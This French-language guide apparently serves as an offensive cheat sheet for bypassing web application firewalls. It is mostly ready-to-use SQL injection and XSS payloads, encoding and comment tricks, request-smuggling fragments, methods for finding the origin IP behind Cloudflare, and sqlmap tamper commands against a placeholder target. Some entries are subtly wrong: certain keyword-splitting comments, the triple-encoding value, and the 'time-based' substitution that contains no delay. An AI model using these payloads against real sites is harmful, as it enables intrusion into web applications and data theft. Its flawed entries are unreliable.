---
name: waf-bypass-techniques
description: Guide complet de contournement WAF — encodings, case manipulation, HTTP parameter pollution, content-type switching, unicode, outils
category: cybersecurite
---

# WAF Bypass — Techniques Avancées

## Comprendre le WAF

### Types de WAF

| Type | Exemples | Détection |
|------|----------|-----------|
| **Basé sur réseau** | ModSecurity, F5 ASM, AWS WAF | IPS/IDS signatures |
| **Basé sur hôte** | ModSecurity on Apache/Nginx, NAXSI | Analyse des requêtes |
| **Cloud** | Cloudflare, Akamai, Imperva | Reverse proxy |
| **Bot Management** | DataDome, PerimeterX | Analyse comportementale |

### Identifier le WAF
```bash
# wafw00f
wafw00f https://target.com

# Réponses caractéristiques
# Cloudflare: 403, cf-ray, __cfduid
# AWS WAF: 403, Request blocked
# ModSecurity: 406, 501, "ModSecurity"
# Imperva: 403, incapsula
# F5: 200, TS0115f1e2
# Akamai: 403, reference number
# DataDome: 403, datadome

# Fingerprinting
nmap --script http-waf-fingerprint target.com
nmap --script http-waf-detect target.com
```

## Techniques de Base

### 1. Encodage

**URL Encoding:**
```sql
# Simple
' OR 1=1-- → %27%20OR%201%3D1--

# Double encoding
' → %25%32%37  (le WAF décode → %27 → ')

# Triple encoding
' → %25%32%35%33%30%25%33%37
```

**Unicode/UTF-8 bypass:**
```sql
# Unicode fullwidth (IDN homograph)
' → ％２７
1 → %EF%BC%91
SELECT → %EF%BC%B3%EF%BC%A5%EF%BC%AC%EF%BC%A5%EF%BC%A3%EF%BC%B4

# Unicode normalization bypass
# C0: Ā → %C4%80 (UTF-8 encoded Latin A)
# %C0%AE → . (ASCII .) via normalization bug
```

**HTML entities:**
```sql
&#39; OR 1=1--  
&#x27; OR 1=1--
```

### 2. Case Manipulation

```sql
# SQL — case mixing
sElEcT * FrOm users WhErE id=1

# Union -> UNIoN
uNiOn AlL sElEcT 1,2,3--

# Hex encoding of keywords
0x73656c656374 → "select"

# MySQL sensitive functions
BeNcHmArK(1000000, Md5(1))
```

### 3. Comment Injection

```sql
# SQL comments inline
SEL/**/ECT * FR/**/OM users/**/WHERE/**/id=1

# Nested comments (MySQL)
/**/SEL/**/ECT/**/
UN/**/ION/**/
/**//*!or*/1=1--

# Comment padding (bypass pattern matching)
SELECT/**/**/**/**/**/FROM/**/**/**/**/users
```

### 4. HTTP Parameter Pollution (HPP)

```bash
# Plusieurs paramètres identiques
?id=1&id=2&id=3
Le serveur prend:
- Apache: dernier
- ASP.NET: premier  
- PHP: dernier
- Tomcat: premier
- Python: liste

# Exemple SQLi
?username=admin&username=admin' OR 1=1--
```

## Techniques Avancées

### 5. Null Bytes et Terminaisons

```sql
# MySQL — Null byte avant l'injection
?id=1%00' OR 1=1--

# PostgreSQL — E'...'
?id=1E' OR 1=1--

# MSSQL — exec avec char()
?id=1; EXEC('sel' + 'ect * fr' + 'om users')

# Tab/Newline
?id=1%0AUNION%0ASELECT%0A1,2,3
?id=1%09UNION%09SELECT%091,2,3
```

### 6. Content-Type Switching

```bash
# JSON-based SQLi
POST /api/login
Content-Type: application/json

{"username": "admin' OR 1=1--", "password": "test"}

# XML-based
Content-Type: application/xml
<user><name>admin' OR 1=1--</name></user>

# Multipart form
Content-Type: multipart/form-data; boundary=xxx

# Text/plain
Content-Type: text/plain
```

### 7. HTTP Method Override

```bash
# POST vers GET
POST /api/login
X-HTTP-Method-Override: GET

# Tunneling via POST
POST /api
X-HTTP-Method: DELETE
```

### 8. Request Size Limits

```bash
# Envoyer un gros volume de données pour dépasser la limite d'analyse du WAF
payload=$(python -c "print('A'*10000 + \"' OR 1=1--\")")

# Padding avec des cookies géants
Cookie: session=AAAA...[10000 bytes]
```

## Cloudflare Bypass

```bash
# Cloudflare — attaque directement l'IP d'origine
# Trouver l'IP réelle
# Via shodan, censys, cert.sh
curl https://crt.sh/?q=%.target.com

# Via historique DNS
dig target.com A
# Comparer avec les IPs non-Cloudflare dans l'historique

# Via email headers
# Envoyer un email à target.com → analyser les en-têtes reçues

# Via favicon hash
python3 favicon_hash.py https://target.com/favicon.ico
shodan search http.favicon.hash:<hash>

# Via subdomain brute-force
subfinder -d target.com | httpx | grep -v cloudflare

# Direct IP access
curl http://REAL_IP -H "Host: target.com"
```

### Cloudflare SSRF
```bash
# Si l'application a un SSRF, l'IP réelle peut être découverte
# Faire une requête SSRF qui revient vers votre server
```

## WAF Bypass par Requêtes Fragmentées

```bash
# Chunked Transfer Encoding
Transfer-Encoding: chunked

5
SELEC
8
T 1,2,3
1
 
2
FR
4
OM u
3
sers

# HTTP Request Smuggling
Content-Length: 0
Transfer-Encoding: chunked

# CL.TE ou TE.CL selon le parseur
```

## Outils de Contournement

| Outil | Description |
|-------|-------------|
| **SQLMap (--tamper)** | 100+ tamper scripts intégrés |
| **JSQL** | Injection GUI avec bypass |
| **Burp Intruder + Bypass WAF** | Extension Burp |
| **WAFW00F** | Identification WAF |
| **Nuclei (fuzzing-templates)** | Templates de bypass |
| **bypass-403** | Bypass d'URL / chemin |
| **CF-Bypass** | Obfuscation multi-couche |

### SQLMap — Tamper Scripts
```bash
# Les tamper scripts importants
sqlmap -u "http://target.com?id=1" --tamper=space2comment --level=3
sqlmap -u "http://target.com?id=1" --tamper=charencode --level=3
sqlmap -u "http://target.com?id=1" --tamper=between --level=3

# Combinaisons
sqlmap -u "http://target.com?id=1" --tamper=apostrophemask,apostrophenullenc,base64encode,charunicodeescape,equaltolike,randomcase --level=5

# Créer son propre tamper
# Copier un script existant dans ~/.sqlmap/tamper/
```

## XSS WAF Bypass

```html
# Event handlers alternatifs
<body onload=alert(1)>
<body onfocus=alert(1) autofocus>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>

# Encodage
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

# Sans parenthèses
<img src=x onerror=alert`1`>
<img src=x onerror=alert.call`${1}`>

# Sans guillemets
<img src=x onerror=alert(1)//>
<img src=x onerror=alert(1)>

# Mutation XSS (mXSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## SQLi WAF Bypass (Référence rapide)

```sql
# Opérateur logique alternatif
OR → ||
AND → &&
= → LIKE, IN, BETWEEN
<> → !=, NOT ... = ...

# Information_schema bypass
information_schema.tables → sys.objects (MSSQL)
mysql.innodb_table_stats (MySQL)

# Subquery bypass
UNION SELECT → UNION (SELECT...)
UNION SELECT 1,2,3 → UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

# Time-based sans SLEEP/BENCHMARK
OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)  →  OR (SELECT 1 FROM (SELECT(1)UNION SELECT(2))a)
```

## Checklist Contournement

1. Identifier le WAF et sa version
2. Tester l'IP directe (bypass cloud)
3. URL encoding double/triple
4. Unicode/UTF-8 bypass
5. Comment injection inline
6. Case randomization
7. HTTP Parameter Pollution
8. Null bytes / tabulations
9. Content-Type switching
10. Chunked encoding / Request Smuggling
11. Large payload pour saturer l'analyse
12. Tamper scripts automatisés
13. HTTP method override
14. Variables d'environnement via headers
15. WAF specific CVE (versions obsolètes)

## Ressources

- **HackTricks WAF Bypass**: https://book.hacktricks.wiki/en/pentesting-web/bypass-waf/index.html
- **PayloadsAllTheThings WAF**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Application%20Firewall%20Bypass
- **SQLMap Tamper Scripts**: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- **WAFW00F**: https://github.com/EnableSecurity/wafw00f
- **bypass-403**: https://github.com/iamj0ker/bypass-403
- **CloudFlare IP Finder**: https://github.com/vincentcox/bypass-firewalls-by-DNS-history